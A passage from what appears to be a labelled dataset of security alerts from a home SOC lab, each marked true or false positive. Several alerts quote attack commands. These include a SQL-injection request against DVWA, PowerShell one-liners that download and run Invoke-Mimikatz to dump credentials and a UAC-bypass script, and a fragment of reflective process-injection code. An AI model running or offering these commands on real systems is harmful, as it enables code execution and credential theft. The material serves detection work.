RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-06 13:51:16.231
ProcessGuid: {ff3427f9-7f54-686a-1006-000000001600}
ProcessId: 6328
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: hostname  
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-5f92-686a-d1e8-3b0200000000}
LogonId: 0x23BE8D1
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=4BD0421A6428638B02F19F69BDA6AB9A4C18755B,MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB
ParentProcessGuid: {ff3427f9-7f54-686a-0f06-000000001600}
ParentProcessId: 3964
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe  /Q /c hostname 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
sshd: Attempt to login using a non-existent user 5 Low sshd: Attempt to login using a non-existent user 5710 syslog sshd authentication_failed invalid_login sshd Suricata Jul 07 20:28:55 Suricata sshd[2175]: Failed password for invalid user top-usernames-shortlist.txt from 10.0.2.8 port 39004 ssh2 journald,1,TP
"File added to the system. 5 Low File added to the system. 554 ossec syscheck syscheck_entry_added syscheck_file syscheck_new_entry Linux-Server File '/home/vboxuser/test.txt' added
Mode: realtime
 syscheck",0,FP
"IIS NetworkCleartext Logon Success 3 Low IIS NetworkCleartext Logon Success 60200 windows windows_security windows_eventchannel WinSrv2019 ""An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		WINSRV2019$
	Account Domain:		SOCLAB
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		8
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-21-3023907177-3273552708-540821291-1000
	Account Name:		vboxuser
	Account Domain:		SOCLAB
	Logon ID:		0xA11D15
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{f23248c3-b3ed-f3fb-4c9a-b2234f75a70c}

Process Information:
	Process ID:		0x500
	Process Name:		C:\Windows\System32\OpenSSH\sshd.exe

Network Information:
	Workstation Name:	WINSRV2019
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."" AUDIT_SUCCESS Microsoft-Windows-Security-Auditing Security EventChannel",0,FP
"A web attack returned code 200 (success). 6 Low A web attack returned code 200 (success). 31106 web accesslog attack web-accesslog Linux-Server 10.0.2.14 - - [04/Jul/2025:21:23:28 +0000] ""GET /DVWA/vulnerabilities/sqli/?id=+%27+union+select+table_name%2Cnull+from+information_schema.tables%23&Submit=Submit&user_token=45d502c959d23a1f39dbdeecb40b3ad0 HTTP/1.1"" 200 1845 ""http://10.0.2.9/DVWA/vulnerabilities/sqli/?id=%27+or+1%3D1&Submit=Submit&user_token=da59db29379faf3476dc05aaaea53f0f"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"" /var/log/apache2/access.log",1,TP
"Powershell script may be executing suspicious code with CreateThread API 10 Medium Powershell script may be executing suspicious code with CreateThread API 91810 windows  powershell windows_eventchannel Win11Client ""Creating Scriptblock text (4 of 11):
teType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
	
		$LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$LocalFreeDelegate = Get-DelegateType @([IntPtr])
		$LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree

		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw ""Cannot subtract bytearrays of different sizes""
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw ""Cannot add bytearrays of different sizes""
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw ""Cannot compare byte arrays of different size""
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = ""Size"", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw ""Trying to write to memory smaller than allocated address range. $DebugString""
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw ""Trying to write to memory greater than allocated address range. $DebugString""
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpec

ScriptBlock ID: b5207ccb-4732-4af2-8224-9d1dde7e3243
Path: "" WARNING Microsoft-Windows-PowerShell Microsoft-Windows-PowerShell/Operational EventChannel",1,TP
"Binary loaded PowerShell automation library - Possible unmanaged Powershell execution by suspicious process 12 High Binary loaded PowerShell automation library - Possible unmanaged Powershell execution by suspicious process 92151 sysmon sysmon_eid7_detections windows windows_eventchannel Win11Client C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe NT AUTHORITY\\SYSTEM ""Image loaded:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2025-06-29 12:18:10.599
ProcessGuid: {ff3427f9-2ee9-6861-6403-000000001000}
ProcessId: 4340
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
ImageLoaded: C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\e3f983991899d4cce4281634a9af277a\System.Management.Automation.ni.dll
FileVersion: 10.0.26100.4202
Description: System.Management.Automation
Product: Microsoft (R) Windows (R) Operating System
Company: Microsoft Corporation
OriginalFileName: System.Management.Automation.dll
Hashes: SHA1=08398B65BEEBE3432181A0D645FC555DA830DD6E,MD5=3CCAF9F54B2ED219C026E1B509E415BE,SHA256=F55015B3D6A76299D38188A13FE4E2ECA7A6655F0189C86C1C050866B4CBE135,IMPHASH=00000000000000000000000000000000
Signed: false
Signature: -
SignatureStatus: Unavailable
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"The Windows search service started. 3 Low The Windows search service started. 60668 windows windows_application windows_eventchannel Win11Client ""The Windows Search Service started.
"" INFORMATION Microsoft-Windows-Search Application EventChannel",0,FP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""cmd.exe\"" /c echo \""Hello from the Windows Command Prompt!\"" &gt; \""%%TEMP%%\\test.bin\"" &amp; type \""%%TEMP%%\\test.bin\"" \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 19:08:27.383
ProcessGuid: {ff3427f9-26ab-6868-0202-000000001400}
ProcessId: 10208
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c echo ""Hello from the Windows Command Prompt!"" > ""%%TEMP%%\test.bin"" & type ""%%TEMP%%\test.bin""
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Process loaded taskschd.dll module. May be used to create delayed malware execution 4 Low Process loaded taskschd.dll module. May be used to create delayed malware execution 92154 sysmon sysmon_eid7_detections windows windows_eventchannel WinSrv2019 C:\\Windows\\System32\\sppsvc.exe NT AUTHORITY\\NETWORK SERVICE ""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2025-07-03 08:37:23.531
ProcessGuid: {6a97c67b-4124-6866-ef00-000000000a00}
ProcessId: 3948
Image: C:\Windows\System32\sppsvc.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.17763.2213 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=E49579BEE3E179E3138CED6EA3550FCBB4C152B1,MD5=8C97A2B62DF4EEB7212651D6CCF9526F,SHA256=60CE286B7B62DD3C77F63C79742D43C6BA33393E41F9FBC93E1C6239019D9A96,IMPHASH=723D6EBFFD0528A2001EABF3A7BAFF6C
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\NETWORK SERVICE"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Windows backup and restore tool sdclt.exe launched via C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe with High integrity level 3 Low Windows backup and restore tool sdclt.exe launched via C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe with High integrity level 92061 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""C:\\WINDOWS\\system32\\sdclt.exe\"" Powershell.exe  \""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"" C:\\Windows\\System32\\sdclt.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1086,technique_name=PowerShell
UtcTime: 2025-07-04 20:24:13.624
ProcessGuid: {ff3427f9-386d-6868-b702-000000001400}
ProcessId: 3360
Image: C:\Windows\System32\sdclt.exe
FileVersion: 10.0.26100.3912 (WinBuild.160101.0800)
Description: Microsoft® Windows Backup
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: sdclt.exe
CommandLine: ""C:\WINDOWS\system32\sdclt.exe"" 
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=8AC6E663FD91342954F67435E25E017726D28B1D,MD5=3813C8CC7C29B96A9B87018DA326D97B,SHA256=1BB9A6F923B3BA8AA26A935A3B92F563CECEA3668C6085768AC33FC703C1F5EB,IMPHASH=43F4450BA53BDDAE70F4D46494FCF21D
ParentProcessGuid: {ff3427f9-386c-6868-b602-000000001400}
ParentProcessId: 8912
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: Powershell.exe  ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'""
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Logon Failure - Unknown user or bad password 5 Low Logon Failure - Unknown user or bad password 60122 windows windows_security authentication_failed windows_eventchannel WinSrv2019 ""An account failed to log on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		WINSRV2019$
	Account Domain:		SOCLAB
	Logon ID:		0x3E7

Logon Type:			8

Account For Which Logon Failed:
	Security ID:		S-1-0-0
	Account Name:		vboxuser@soclab.internal
	Account Domain:		

Failure Information:
	Failure Reason:		Unknown user name or bad password.
	Status:			0xC000006D
	Sub Status:		0xC000006A

Process Information:
	Caller Process ID:	0x500
	Caller Process Name:	C:\Windows\System32\OpenSSH\sshd.exe

Network Information:
	Workstation Name:	WINSRV2019
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon request fails. It is generated on the computer where access was attempted.

The Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).

The Process Information fields indicate which account and process on the system requested the logon.

The Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The authentication information fields provide detailed information about this specific logon request.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."" AUDIT_FAILURE Microsoft-Windows-Security-Auditing Security EventChannel",0,FP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""cmd.exe\"" /c powershell.exe \""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"" \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 20:21:45.956
ProcessGuid: {ff3427f9-37d9-6868-a802-000000001400}
ProcessId: 3676
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds""
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Possible DLL search order hijack by C:\\Windows\\SoftwareDistribution\\Download\\8254f248060006e8b7dcc36da9c8f403\\Metadata\\fvereseal.dll created in Windows root folder 6 Low Possible DLL search order hijack by C:\\Windows\\SoftwareDistribution\\Download\\8254f248060006e8b7dcc36da9c8f403\\Metadata\\fvereseal.dll created in Windows root folder 92219 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\System32\\svchost.exe C:\\Windows\\SoftwareDistribution\\Download\\8254f248060006e8b7dcc36da9c8f403\\Metadata\\fvereseal.dll NT AUTHORITY\\SYSTEM ""File created:
RuleName: technique_id=T1047,technique_name=File System Permissions Weakness
UtcTime: 2025-07-04 21:10:51.161
ProcessGuid: {ff3427f9-1e6a-6868-1400-000000001400}
ProcessId: 1220
Image: C:\WINDOWS\System32\svchost.exe
TargetFilename: C:\Windows\SoftwareDistribution\Download\8254f248060006e8b7dcc36da9c8f403\Metadata\fvereseal.dll
CreationUtcTime: 2024-09-04 20:13:44.000
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""cmd.exe\"" /c cmd /r cmd&lt;\""C:\\AtomicRedTeam\\atomics\\T1059.003\\src\\t1059.003_cmd.cmd\"" \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 19:08:53.181
ProcessGuid: {ff3427f9-26c5-6868-0c02-000000001400}
ProcessId: 5676
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
